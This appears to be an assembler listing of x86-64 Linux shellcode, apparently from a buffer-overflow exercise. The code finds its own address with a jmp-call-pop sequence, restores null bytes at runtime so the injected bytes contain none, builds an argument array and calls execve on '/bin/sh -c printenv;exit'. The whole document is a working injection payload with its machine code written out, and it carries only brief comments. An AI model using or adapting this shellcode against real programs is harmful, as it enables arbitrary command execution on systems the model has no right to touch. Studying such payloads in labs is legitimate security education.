     1                                            bits 64
     2                                              ; find out where we are
     3 00000000 EB4F                    start:     jmp short codeEnd
     4 00000002 5E                      start2:    pop rsi
     5                                  
     6                                              ; clear the a register
     7 00000003 4831C0                             xor rax,rax
     8                                  
     9                                              ; restore null bytes to data (setting null where 'x' is)
    10 00000006 884607                             mov [rsi+flagStr-exeStr-2],al
    11 00000009 88460B                             mov [rsi+cmdStr-exeStr-1],al
    12 0000000C 884619                             mov [rsi+arrayAddr-exeStr-1],al
    13 0000000F 48894632                           mov [rsi+arrayAddr-exeStr+24],rax
    14                                  
    15 00000013 4889761A                           mov [rsi+arrayAddr-exeStr],rsi 
    16 00000017 488D7E09                           lea rdi, [byte rsi+flagStr-exeStr]
    17 0000001B 48897E22                           mov [rsi+arrayAddr-exeStr+8],rdi
    18 0000001F 488D7E0C                           lea rdi, [byte rsi+cmdStr-exeStr]
    19 00000023 48897E2A                           mov [rsi+arrayAddr-exeStr+16],rdi
    20                                  
    21 00000027 4889E2                             mov rdx, rsp
    22 0000002A 48C1EA20                           shr rdx, 32
    23 0000002E 48C1E220                           shl rdx, 32
    24                                  
    25 00000032 B9FFE6FBF7                         mov rcx, 0xf7fbe6FF
    26 00000037 30C9                               xor cl, cl
    27 00000039 4809CA                             or rdx, rcx
    28 0000003C 488B12                             mov rdx, [rdx]
    29                                  
    30                                  
    31                                              ; execve system call 
    32                                              ; 0x3b
    33 0000003F B03B                               mov al,0x3b
    34 00000041 4889F7                             mov rdi,rsi
    35 00000044 488D761A                           lea rsi,[rsi+arrayAddr-exeStr]
    36 00000048 0F05                               syscall
    37                                  
    38                                              ; exit system call
    39 0000004A B03C                               mov al,0x3c
    40 0000004C 4889C7                             mov rdi, rax
    41 0000004F 0F05                               syscall
    42                                  
    43 00000051 E8ACFFFFFF              codeEnd:   call start2
    44                                              ; data
    45 00000056 2F62696E2F73685879      exeStr:    db "/bin/shXy"
    46 0000005F 2D6358                  flagStr:   db "-cX"
    47 00000062 7072696E74656E763B-     cmdStr:    db "printenv;exitX"
    47 0000006B 6578697458         
    48 00000070 FFFFFFFFFFFFFFFF        arrayAddr: dq 0xffffffffffffffff
    49 00000078 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    50 00000080 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    51 00000088 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    52 00000090 9000000000000000        newAddr: dq newAddr-start
